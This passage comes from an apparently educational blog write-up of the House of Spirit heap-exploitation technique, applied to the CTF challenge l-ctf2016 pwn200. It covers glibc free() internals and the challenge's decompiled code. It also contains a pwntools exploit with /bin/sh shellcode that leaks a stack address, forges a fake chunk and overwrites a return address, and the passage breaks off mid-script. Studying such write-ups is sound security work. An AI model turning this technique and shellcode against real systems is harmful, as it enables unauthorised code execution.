punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true">/* free(0) has no effect */</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  p <span class="token operator">=</span> <span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">/* 这里将chunk的M位置零就可以绕过   release mmapped memory. */</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* See if the dynamic brk/mmap threshold needs adjusting.         Dumped fake mmapped chunks do not affect the threshold.  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mp_<span class="token punctuation">.</span>no_dyn_threshold          <span class="token operator">&amp;&amp;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">></span> mp_<span class="token punctuation">.</span>mmap_threshold          <span class="token operator">&amp;&amp;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> DEFAULT_MMAP_THRESHOLD_MAX          <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">DUMPED_MAIN_ARENA_CHUNK</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          mp_<span class="token punctuation">.</span>mmap_threshold <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          mp_<span class="token punctuation">.</span>trim_threshold <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">;</span>          <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_mallopt_free_dyn_thresholds<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>                      mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>trim_threshold<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token function">munmap_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//会调用munmap_chunk函数去释放堆块。</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token function">MAYBE_INIT_TCACHE</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ar_ptr <span class="token operator">=</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_int_free</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>malloc_chunk 结构体：<span class="token keyword">typedef</span> <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> mchunkptr<span class="token punctuation">;</span><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>  INTERNAL_SIZE_T      mchunk_prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      mchunk_size<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>_int_free:</p><pre class=" language-c"><code class="language-c"> <span class="token keyword">void</span>  <span class="token function">_int_free</span><span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> Void_t<span class="token operator">*</span> mem<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    mchunkptr       p<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">/*指向malloc_chunk结构体 chunk corresponding to mem */</span>    INTERNAL_SIZE_T size<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* its size */</span>    mfastbinptr<span class="token operator">*</span>    fb<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* associated fastbin */</span>    <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>   p <span class="token operator">=</span> <span class="token function">mem2chunk</span><span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>   size <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">/*     If eligible, place chunk on a fastbin so it can be found     and used quickly in malloc.   */</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>av<span class="token operator">-></span>max_fast<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">/*其次，size的大小不能超过fastbin的最大值*/</span> <span class="token macro property">#<span class="token directive keyword">if</span> TRIM_FASTBINS</span>       <span class="token comment" spellcheck="true">/*        If TRIM_FASTBINS set, don't place chunks        bordering top into fastbins       */</span>       <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span> <span class="token macro property">#<span class="token directive keyword">endif</span></span>       <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>                          <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/</span>       <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (fast)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>       <span class="token punctuation">}</span>     <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>     fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>av<span class="token operator">-></span>fastbins<span class="token punctuation">[</span><span class="token function">fastbin_index</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>     p<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>   <span class="token punctuation">}</span></code></pre><p>总的来说我们要绕过的有以下几点（还不怎么会分析源码）</p><ul><li>fake_chunk-&gt;size 的M位是0，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem  （一句话就是恰当即可）</li></ul><h2 id="实例：l-ctf2016–pwn200"><a href="#实例：l-ctf2016–pwn200" class="headerlink" title="实例：l-ctf2016–pwn200"></a>实例：l-ctf2016–pwn200</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>house of spirit$ checksec pwn200<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/how2heap/house of spirit/pwn200'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX disabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>    RWX<span class="token operator">:</span>      Has RWX segments保护全关执行：who are u<span class="token operator">?</span>AAAAAAAA<span class="token punctuation">,</span> welcome to xdctf<span class="token operator">~</span>give me your id <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">?</span><span class="token number">12</span>give me money<span class="token operator">~</span><span class="token number">12</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>EASY HOTEL<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">.</span> check in<span class="token number">2</span><span class="token punctuation">.</span> check out<span class="token number">3</span><span class="token punctuation">.</span> goodbyeyour choice <span class="token operator">:</span> </code></pre><h3 id="IDA–关键函数分析"><a href="#IDA–关键函数分析" class="headerlink" title="IDA–关键函数分析"></a>IDA–关键函数分析</h3><h4 id="int-sub-400A8E"><a href="#int-sub-400A8E" class="headerlink" title="int sub_400A8E()"></a>int sub_400A8E()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400A8E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-40h]</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-30h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"who are u?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">47</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//最多读入48个字节</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, welcome to xdctf~\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"give me your id ~~?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read_self</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">// 最多读入4个字符</span>  <span class="token keyword">return</span> <span class="token function">check_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里v2可以存放0x30个字节，恰好能覆盖完rbp-0x8的数据。<br><strong>因为read函数不会 在读取完字符串后面加\x00截断符，所以下面的printf可以泄露栈数据：</strong></p><pre class=" language-java"><code class="language-java"> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x7fffffffde20</span> —▸ <span class="token number">0x7fffffffde40</span> —▸ <span class="token number">0x400b60</span> ◂— push   r15  <span class="token comment" spellcheck="true">//此时rbp是0x7fffffffde20 </span> RSP  <span class="token number">0x7fffffffddd0</span> —▸ <span class="token function">0x7ffff7dcc2a0</span> <span class="token punctuation">(</span>_IO_file_jumps<span class="token punctuation">)</span> ◂— add    <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al    <span class="token operator">*</span>RIP  <span class="token number">0x400b0b</span> ◂— call   <span class="token number">0x400640</span>────────────────────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>─────────────────────────────────────────────────────────────   <span class="token number">0x400afa</span>    lea    rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">]</span>   <span class="token number">0x400afe</span>    mov    rsi<span class="token punctuation">,</span> rax   <span class="token number">0x400b01</span>    mov    edi<span class="token punctuation">,</span> <span class="token number">0x400cd1</span>   <span class="token number">0x400b06</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span> ► <span class="token number">0x400b0b</span>    call   printf<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span>        format<span class="token operator">:</span> <span class="token number">0x400cd1</span> ◂— <span class="token string">'%s, welcome to xdctf~\n'</span>        vararg<span class="token operator">:</span> <span class="token number">0x7fffffffddf0</span> ◂— <span class="token function">0x6161616261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabaaa'</span><span class="token punctuation">)</span>   <span class="token number">0x400b10</span>    mov    edi<span class="token punctuation">,</span> <span class="token number">0x400ce8</span>   <span class="token number">0x400b15</span>    call   puts<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>puts<span class="token annotation punctuation">@plt</span><span class="token operator">></span> ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x7fffffffddf0</span><span class="token number">0x7fffffffddf0</span><span class="token operator">:</span>    <span class="token number">0x6161616261616161</span>    <span class="token number">0x6161616461616163</span><span class="token number">0x7fffffffde00</span><span class="token operator">:</span>    <span class="token number">0x6161616661616165</span>    <span class="token number">0x6161616861616167</span><span class="token number">0x7fffffffde10</span><span class="token operator">:</span>    <span class="token number">0x6161616a61616169</span>    <span class="token number">0x6161616c6161616b</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>数据段与下面一个栈帧没有截断符\x00那么将会把<span class="token number">0x00007fffffffde40</span>翻译为字符串输出直到遇到\x00<span class="token number">0x7fffffffde20</span><span class="token operator">:</span>    <span class="token number">0x00007fffffffde40</span>    <span class="token number">0x0000000000400b59</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>rbp指向的栈数据是 <span class="token number">0x00007fffffffde40</span>  所以我们获取的地址<span class="token operator">-</span><span class="token number">0x20</span>就是该函数rbp的值了<span class="token number">0x7fffffffde30</span><span class="token operator">:</span>    <span class="token number">0x00007fffffffdf28</span>    <span class="token number">0x0000000100000000</span><span class="token number">0x7fffffffde40</span><span class="token operator">:</span>    <span class="token number">0x0000000000400b60</span>    <span class="token number">0x00007ffff7a05b97</span></code></pre><p>我觉得这不算off-by-one<br>还有一个IDA反编译的坑：执行read_self();函数后会有一个返回值，而这里没有看出返回值放在那个变量里，进入到汇编代码：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B10                 mov     edi<span class="token punctuation">,</span> offset aGiveMeYourId <span class="token punctuation">;</span> <span class="token string">"give me your id ~~?"</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B15                 call    _puts<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B1A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B1F                 call    read_self<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B24                 cdqe<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000400B26                 mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_38<span class="token punctuation">]</span><span class="token punctuation">,</span> rax   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>所以ID的值被保存在rbp<span class="token operator">-</span><span class="token number">0x38</span>这里，刚好在v2数组的上面</code></pre><p>接下来就是checkin函数</p><h4 id="check-in"><a href="#check-in" class="headerlink" title="check_in()"></a>check_in()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400A29</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>money_p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  money_p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"give me money~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>money_p<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> money_p<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//后面会有函数对ptr进行free操作</span>  <span class="token keyword">return</span> <span class="token function">sub_4009C4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">checkout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">void</span> <span class="token function">sub_40096D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"out~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">// 堆指针置零</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"havn't check in"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>显然这里可以往buf中读入0x40个字节，也是刚好覆盖rbp-0x8里面的数据，而rbp-0x8放的就是chunk_ptr，也就是money_p 的值。<br><strong>所以说free的地址是我们可控的</strong></p><h4 id="check-in-again"><a href="#check-in-again" class="headerlink" title="check_in_again()"></a>check_in_again()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_4008B7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"already check in"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"how long?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">read_self</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">0x80</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// nbytes 0~0x80</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me more money : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//对应向ptr_chunk读入一定量字节</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"in~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>LODWORD是一个宏定义：返回数据的低字节段 从汇编中这里nbytes是8个字节，LODWORD(nbytes)返回低4字节。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><strong>因为NX没有开启，栈地址可以泄露，然后可以知道整个栈空间排布。我们可以直接向栈中写入shellcode，然后想办法跳转即可。</strong><br>从main函数执行到check_in（sub_400A29）函数stack状况：<br><img src="https://s1.ax1x.com/2020/09/19/w5HYPe.png" alt=""><br>rbp_old_old是main函数中的rbp值，rbp_old是sub_400A8E函数的rbp值<br>最上面的rbp就是checkin函数的rbp，因为最后函数还是要通过栈中保存的返回地址来返回，所以我们的目的就是篡改rbp_old下面的rip</p><p>利用HOS</p><ul><li>money为可控区1,伪造chunk_head</li><li>下面的rip就是目标数据,修改为shellcode_addr</li><li>ID是可控区2,伪造next_chunk</li><li>name空间用来放shellcode </li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn200'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('node3.buuoj.cn',28067)</span>shellcode <span class="token operator">=</span> <span class="token string">'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'who are u?\n'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'bb'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bb'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>rbp_old_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">', welcome'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span>    <span class="token comment" spellcheck="true">#地址泄露</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"rbp_old_addr====>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>rbp_old_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode_addr <span class="token operator">=</span> rbp_old_addr <span class="token operator">-</span> <span class="token number">0x30</span>                                         <span class="token comment" spellcheck="true">#计算shellcode地址</span>fake_chunk_addr <span class="token operator">=</span> rbp_old_addr <span class="token operator">-</span> <span class="token number">0x70</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your id ~~?\n'</span><span class="token punctuation">,</span><span class="token string">'41'</span><span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">#41是伪造next_chunk的size字段0x31</span>money <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">#这里前面放\x00就会使strcpy失效，截断效果。p64(0x41)是size字段</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'give me money~\n'</span><span class="token punctuation">,</span>money<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your choice : '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>                                       <span class="token comment" spellcheck="true">#free掉这个fake_chunk</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your choice : '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>                                       payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp_old_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">#覆盖rip</span>sh<span 